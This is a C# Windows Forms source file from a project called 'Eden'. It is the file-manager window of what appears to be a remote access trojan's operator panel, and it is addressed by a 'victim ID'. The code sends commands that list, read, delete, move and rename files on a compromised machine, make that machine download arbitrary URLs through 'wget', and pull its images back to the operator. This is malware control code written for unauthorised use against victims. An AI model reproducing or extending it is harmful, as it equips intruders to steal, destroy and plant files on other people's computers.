﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Eden
{
    public partial class frmFileMgr : Form
    {
        public Client m_clnt;
        public string szVictimID;

        private ImageList m_ilFileExt;

        private string szHomeDir;

        private List<m_stEntryTag> lsCopy = new List<m_stEntryTag>();

        private struct m_stEntryTag
        {
            public bool bDirectory;
            public string szFullName;
        }

        private struct m_stFileDeleteStatus
        {
            public string szFilename;
            public int nCode;
            public string szMsg;
        }

        private struct m_stWgetStatus
        {
            public string szUrl;
            public string szFilename;
            public int nCode;
            public string szMsg;
        }

        public frmFileMgr()
        {
            InitializeComponent();
        }

        void Received(Client clnt, string szVictimID, string[] aMsg)
        {
            try
            {
                if (szVictimID != this.szVictimID)
                    return;

                if (aMsg[0] == "file")
                {
                    if (aMsg[1] == "init") //Initialization.
                    {
                        string szDir = aMsg[2];

                        Invoke(new Action(() =>
                        {
                            textBox1.Text = szDir;
                            textBox1.Tag = szDir;
                            szHomeDir = szDir;

                            TreeNode tn = AddTreeNodeWithFullPath(treeView1, $"/{szDir.Replace("/", "\\")}");
                            treeView1.SelectedNode = tn;
                        }));
                    }
                    else if (aMsg[1] == "ls") //List dir.
                    {
                        string szDirPath = aMsg[2];
                        if (!string.Equals(szDirPath, GetCurrentDir()))
                            return;

                        string szJsonPayload = aMsg[3];

                        List<ListViewItem> lsDir = new List<ListViewItem>();
                        List<ListViewItem> lsFile = new List<ListViewItem>();

                        foreach (string szJson in Tools.EZData.String2OneDList(szJsonPayload))
                        {
                            Dictionary<string, JsonElement> dic = Tools.EZData.JsonStr2Dic(szJson);

                            string szName = dic["Name"].GetString();
                            bool bIsDir = szName[0] == '/';

                            //Key of dictionary "dic"
                            string[] aKeys =
                            {
                                "Size",
                                "Permission",
                                "CreateDate",
                                "LastModified",
                                "LastAccessed",
                            };

                            //Name: Dictionary: /dirname, File: filename.
                            ListViewItem item = new ListViewItem(bIsDir ? new string(szName.Skip(1).ToArray()) : szName);
                            item.SubItems.AddRange(
                                aKeys.Select(x => new ListViewItem.ListViewSubItem()
                                {
                                    Text = dic[x].ToString(),
                                })
                                .ToArray()
                            );
                            item.Tag = new m_stEntryTag()
                            {
                                bDirectory = bIsDir,
                                szFullName = $"{szDirPath}/{item.Text}",
                            };

                            //Classify listview items.
                            if (bIsDir)
                                lsDir.Add(item);
                            else
                                lsFile.Add(item);
                        }

                        Invoke(new Action(() =>
                        {
                            listView1.Items.AddRange(lsDir.Concat(lsFile).ToArray());

                            //Process lsDir and add them in treeview.
                            TreeNode currentNode = tnFindTreeNodeFromTreeView(treeView1.Nodes, szDirPath);
                            if (currentNode == null)
                            {
                                MessageBox.Show("currentNode is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            lsDir = lsDir.Where(x => tnFindTreeNodeFromTreeView(treeView1.Nodes, $"{GetCurrentDir()}/{x.Text}") == null).ToList();

                            if (currentNode.Nodes.Count == 0)
                                currentNode.Nodes.AddRange(lsDir.Select(x => new TreeNode(x.Text)).ToArray());
                            else
                            {
                                foreach (ListViewItem item in lsDir)
                                {
                                    TreeNode node = new TreeNode(item.Text);
                                    bool bAdd = false;
                                    for (int i = 0; i < currentNode.Nodes.Count; i++)
                                    {
                                        if (string.Compare(currentNode.Nodes[i].Text, node.Text) > 0)
                                        {
                                            currentNode.Nodes.Insert(i, node);
                                            bAdd = true;
                                            break;
                                        }
                                    }

                                    if (!bAdd)
                                    {
                                        currentNode.Nodes.Add(node);
                                    }
                                }
                            }

                            treeView1.ExpandAll();
                            toolStripStatusLabel1.Text = $"Action successfulyl, Folder[{lsDir.Count}], File[{lsFile.Count}]";
                        }));
                    }
                    else if (aMsg[1] == "read")
                    {
                        string szPayload = aMsg[2];
                        List<List<string>> lsResults = Tools.EZData.String2TwoDList(szPayload);

                        foreach (var lsResult in lsResults)
                        {
                            string szFilename = lsResult[0];
                            string szContent = lsResult[1];

                            ShowReadFile(szFilename, szContent);
                        }
                    }
                    else if (aMsg[1] == "write")
                    {
                        int code = int.Parse(aMsg[2]);
                        if (code == 0)
                        {
                            MessageBox.Show(aMsg[3], "Write error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else if (aMsg[1] == "del")
                    {
                        List<List<string>> lsResult = Tools.EZData.String2TwoDList(aMsg[2]);
                        List<m_stFileDeleteStatus> ls = new List<m_stFileDeleteStatus>();

                        foreach (var obj in lsResult)
                        {
                            m_stFileDeleteStatus st = new m_stFileDeleteStatus()
                            {
                                szFilename = obj[0],
                                nCode = int.Parse(obj[1]),
                                szMsg = obj[2],
                            };

                            ls.Add(st);
                        }

                        ShowDeleteFile(ls);

                        LvRefresh();
                    }
                    else if (aMsg[1] == "uf")
                    {

                    }
                    else if (aMsg[1] == "df")
                    {

                    }
                    else if (aMsg[1] == "touch")
                    {

                    }
                    else if (aMsg[1] == "wget")
                    {
                        List<List<string>> lsResults = Tools.EZData.String2TwoDList(aMsg[2]);
                        List<m_stWgetStatus> ls = new List<m_stWgetStatus>();
                        foreach (var result in lsResults)
                        {
                            m_stWgetStatus st = new m_stWgetStatus()
                            {
                                szUrl = result[0],
                                szFilename = result[1],
                                nCode = int.Parse(result[2]),
                                szMsg = result[3],
                            };

                            ls.Add(st);
                        }

                        ShowWget(ls);

                        LvRefresh();
                    }
                    else if (aMsg[1] == "new")
                    {
                        if (aMsg[2] == "d")
                        {
                            string szDirName = EZCrypto.Encoder.b64d2str(aMsg[3]);
                            int nCode = int.Parse(aMsg[4]);

                            if (nCode == 1)
                            {
                                MessageBox.Show("Add directory successfully:\n" + szDirName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                    }
                    else if (aMsg[1] == "goto")
                    {
                        Invoke(new Action(() =>
                        {
                            string szDirName = aMsg[2];
                            int nCode = int.Parse(aMsg[3]);

                            if (nCode == 0)
                            {
                                MessageBox.Show("Path not found: " + szDirName, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                textBox1.Text = GetCurrentDir();

                                return;
                            }

                            textBox1.Text = szDirName;
                            textBox1.Tag = szDirName;

                            TreeNode tn = tnFindTreeNodeFromTreeView(treeView1.Nodes, szDirName);
                            if (tn == null)
                                tn = AddTreeNodeWithFullPath(treeView1, "/" + szDirName.Replace("/", "\\"));

                            treeView1.SelectedNode = tn;
                        }));
                    }
                    else if (aMsg[1] == "error")
                    {
                        MessageBox.Show(aMsg[2], aMsg[3], MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name);
            }
        }

        private TreeNode tnFindTreeNodeFromTreeView(TreeNodeCollection aTreeNodes, string szFullPath, StringComparison method = StringComparison.OrdinalIgnoreCase)
        {
            string Convert2LinuxPath(string szNodePath) => szNodePath.Replace("\\", "/").Replace("///", "/").Replace("//", "/");

            var foundNode = aTreeNodes.Cast<TreeNode>().FirstOrDefault(tn => string.Equals(Convert2LinuxPath(tn.FullPath), szFullPath, method));
            if (null == foundNode)
            {
                foreach (var childNode in aTreeNodes.Cast<TreeNode>())
                {
                    var foundChildNode = tnFindTreeNodeFromTreeView(childNode.Nodes, szFullPath, method);
                    if (null != foundChildNode)
                    {
                        return foundChildNode;
                    }
                }
            }

            return foundNode;
        }

        private TreeNode AddTreeNodeWithFullPath(TreeView tv, string szFullPath, TreeNode tn = null)
        {
            string[] aDir = szFullPath.Split('\\');
            if (aDir.Length > 0 && !string.IsNullOrEmpty(aDir[0]))
            {
                foreach (TreeNode node in tn == null ? tv.Nodes : tn.Nodes)
                {
                    if (node.Text == aDir[0])
                    {
                        tn = node;
                        return AddTreeNodeWithFullPath(tv, string.Join("\\", aDir[1..]), tn);
                    }
                }

                if (tn == null)
                {
                    tn = new TreeNode(aDir[0]);
                    tv.Nodes.Add(tn);
                }
                else
                {
                    TreeNode subNode = new TreeNode(aDir[0]);
                    tn.Nodes.Add(subNode);
                    tn = subNode;
                    tn.EnsureVisible();
                }

                string szNewPath = string.Join("\\", aDir[1..]);
                return AddTreeNodeWithFullPath(tv, szNewPath, tn);
            }

            treeView1.ExpandAll();

            return tn;
        }

        private void SendReadFile(string szFilename)
        {
            m_clnt.SendVictim(szVictimID, $"File|read|{szFilename}");
        }
        private void SendReadFile(List<string> lsFiles, bool bSendAll = true)
        {
            if (bSendAll)
            {
                m_clnt.SendVictim(szVictimID, $"File|read|" + string.Join("|", lsFiles));
            }
            else
            {
                //Send payload one by one.
                foreach (string szFilename in lsFiles)
                    SendReadFile(szFilename);
            }
        }
        private void ShowReadFile(string szFilename, string szContent)
        {
            Invoke(new Action(() =>
            {
                frmFileEditor f = Tools.FindForm<frmFileEditor>(szVictimID);
                if (f == null)
                {
                    f = new frmFileEditor();
                    f.szVictimID = szVictimID;

                    f.Show();
                }

                f.ShowFileContent(szFilename, szContent);
            }));
        }

        private List<string> GetDeleteFilesFromSelectedItems()
        {
            List<string> lsFiles = new List<string>();
            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.SelectedItems)
                {
                    var st = (m_stEntryTag)item.Tag;
                    lsFiles.Add(st.szFullName + (st.bDirectory ? "/" : string.Empty));
                }
            }));

            return lsFiles;
        }
        private void SendDeleteFile(string szFile)
        {
            m_clnt.SendVictim(szVictimID, $"File|del|{szFile}");
        }
        private void SendDeleteFile(List<string> lsFiles, bool bSendAll = true, bool bShowWindow = true)
        {
            if (bShowWindow)
            {
                string[] aCols = { "Filename", "Status" };

                frmListViewItem f = new frmListViewItem();
                f.m_aCols = aCols;
                f.m_aItemText = lsFiles.ToArray();
                f.szVictimID = szVictimID;

                f.Show();
            }

            if (bSendAll)
            {
                m_clnt.SendVictim(szVictimID, $"File|del|{string.Join("|", lsFiles)}");
            }
            else
            {
                foreach (string szFile in lsFiles)
                    SendDeleteFile(szFile);
            }
        }
        private void ShowDeleteFile(List<m_stFileDeleteStatus> lsFiles)
        {
            Invoke(new Action(() =>
            {
                frmListViewItem f = Tools.FindForm<frmListViewItem>(szVictimID);
                if (f != null)
                {
                    foreach (var st in lsFiles)
                    {
                        f.UpdateStatus(st.szFilename, st.szMsg);
                    }
                }
            }));
        }

        public void SendWget(string szUrl)
        {
            m_clnt.SendVictim(szVictimID, "File|wget|" + szUrl);
        }
        public void SendWget(List<string> lsUrls, bool bOnebyOne = false, bool bShowWindow = true)
        {
            if (bShowWindow)
            {
                string[] alpCols = { "Url", "Filename", "Message" };
                frmListViewItem f = new frmListViewItem();
                f.m_aCols = alpCols;
                f.szVictimID = szVictimID;
                f.m_aItemText = lsUrls.ToArray();

                f.Show();
            }

            if (bOnebyOne)
            {
                foreach (string szUrl in lsUrls)
                    SendWget(szUrl);
            }
            else
            {
                m_clnt.SendVictim(szVictimID, "File|wget|" + string.Join("|", lsUrls));
            }
        }
        private void ShowWget(List<m_stWgetStatus> lsWgets)
        {
            Invoke(new Action(() =>
            {
                frmListViewItem f = Tools.FindForm<frmListViewItem>(szVictimID);
                if (f != null)
                {
                    foreach (var st in lsWgets)
                    {
                        f.UpdateStatus(st.szUrl, st.szFilename, st.szMsg);
                    }
                }
            }));
        }

        private string GetCurrentDir()
        {
            string szDir = string.Empty;
            Invoke(new Action(() => szDir = textBox1.Tag.ToString()));

            return szDir;
        }

        private void SendGoto(string szDirName)
        {
            m_clnt.SendVictim(szVictimID, "File|goto|" + szDirName);
        }

        private void SendPaste(List<m_stEntryTag> lsEntry, bool bMove = false)
        {
            string[] aEntry = lsEntry.Select(x => x.bDirectory ? $"{x.szFullName}/" : x.szFullName).ToArray();

            frmListViewItem f = new frmListViewItem();
            f.m_aCols = new string[] { "Name", "Status" };
            f.m_aItemText = aEntry;
            f.Show();

            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{Tools.EZData.OneDList2String(aEntry.ToList())}|{GetCurrentDir()}");
        }

        private void LvRefresh()
        {
            Invoke(new Action(() =>
            {
                TreeNode node = treeView1.SelectedNode ?? tnFindTreeNodeFromTreeView(treeView1.Nodes, GetCurrentDir());
                if (node == null)
                {
                    MessageBox.Show("Variable \"node\" is null.", "Null", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                treeView1.SelectedNode = null;
                treeView1.SelectedNode = node;
            }));
        }

        void setup()
        {
            if (m_clnt == null)
            {
                MessageBox.Show("m_clnt is null");
                Close();
                return;
            }

            toolStripStatusLabel1.Text = "Loading...";

            //ListView
            listView1.View = View.Details;
            string[] aCols = { "Name", "Size", "Permission", "CreateDate", "LastModified", "LastAccessed" };
            foreach (string szCol in aCols)
            {
                ColumnHeader header = new ColumnHeader();
                header.Text = szCol;
                header.Width = 150;

                listView1.Columns.Add(header);
            }

            m_clnt.ServerMessageReceived += Received;
            m_clnt.SendVictim(szVictimID, @$"File|init");
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            toolStripStatusLabel1.Text = "Loading...";

            listView1.Items.Clear();

            string szDirPath = treeView1.SelectedNode.FullPath;
            string szLinuxPath = $"/{szDirPath.Replace("\\", "/")}".Replace("///", "/").Replace("//", "/");

            textBox1.Text = szLinuxPath;
            textBox1.Tag = szLinuxPath;

            int nMaxFolder = 100;
            int nMaxFile = 100;

            m_clnt.SendVictim(szVictimID, $"File|ls|{szLinuxPath}|{nMaxFolder}|{nMaxFile}");
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            var stFile = (m_stEntryTag)items[0].Tag;
            if (stFile.bDirectory)
            {
                TreeNode tn = tnFindTreeNodeFromTreeView(treeView1.Nodes, stFile.szFullName);
                treeView1.SelectedNode = tn;
                return;
            }

            SendReadFile(stFile.szFullName);
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            List<string> lsFiles = new List<string>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var stFiles = (m_stEntryTag)item.Tag;
                if (stFiles.bDirectory)
                    continue;

                lsFiles.Add(stFiles.szFullName);
            }

            SendReadFile(lsFiles);
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                SendGoto(textBox1.Text);
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    LvRefresh();
                }
                else if (e.KeyCode == Keys.Delete)
                {
                    SendDeleteFile(GetDeleteFilesFromSelectedItems());
                }
            }
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            SendDeleteFile(GetDeleteFilesFromSelectedItems());
        }

        //Refresh
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            LvRefresh();
        }
        //Home
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            treeView1.SelectedNode = tnFindTreeNodeFromTreeView(treeView1.Nodes, szHomeDir);
        }
        //Parent
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            treeView1.SelectedNode = treeView1.SelectedNode?.Parent;
        }

        //Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            lsCopy.Clear();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_stEntryTag tag = (m_stEntryTag)item.Tag;
                lsCopy.Add(tag);
            }
        }
        //Move
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (lsCopy.Count > 0)
            {
                SendPaste(lsCopy, true);
            }
        }
        //Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (lsCopy.Count > 0)
            {
                SendPaste(lsCopy);
            }
        }
        //Rename
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            var tag = (m_stEntryTag)items[0].Tag;

            frmFileRename f = new frmFileRename();
            f.m_szEntryName = tag.szFullName;
            f.m_bDirectory = tag.bDirectory;
            f.m_clnt = m_clnt;
            f.szVictimID = szVictimID;

            f.ShowDialog();
        }
        //WGET
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            frmFileWGET f = new frmFileWGET();
            f.m_fMgr = this;

            f.Show();
        }
        //Upload
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {

            }
        }
        //Download
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {

        }
        //New - Folder
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            frmFileAddDir f = new frmFileAddDir();
            f.m_clnt = m_clnt;

            f.ShowDialog();
        }
        //New - File
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            frmFileEditor f = new frmFileEditor();
            f.szVictimID = szVictimID;
            f.m_clnt = m_clnt;

            f.Show();

            f.ShowFileContent(GetCurrentDir() + "/NewFile_" + Tools.GetFileNameFromDatetime("txt"), string.Empty);
        }
        //Image - Selected
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            List<string> lsImgFilename = new List<string>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var st = (m_stEntryTag)item.Tag;
                if (!st.bDirectory && Tools.IsImageFilename(st.szFullName))
                    lsImgFilename.Add(st.szFullName);
            }

            frmFileImage f = Tools.FindForm<frmFileImage>(szVictimID);
            if (f == null)
            {
                f = new frmFileImage();

                f.szVictimID = szVictimID;
                f.m_clnt = m_clnt;
                f.m_lsImgFilename = lsImgFilename;
            }

            f.Show();
        }
        //Image - All
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            List<string> lsImgFilename = new List<string>();
            foreach (ListViewItem item in listView1.Items)
            {
                var st = (m_stEntryTag)item.Tag;
                if (!st.bDirectory && Tools.IsImageFilename(st.szFullName))
                    lsImgFilename.Add(st.szFullName);
            }

            frmFileImage f = Tools.FindForm<frmFileImage>(szVictimID);
            if (f == null)
            {
                f = new frmFileImage();

                f.szVictimID = szVictimID;
                f.m_clnt = m_clnt;
                f.m_lsImgFilename = lsImgFilename;
            }

            f.Show();
        }
    }
}
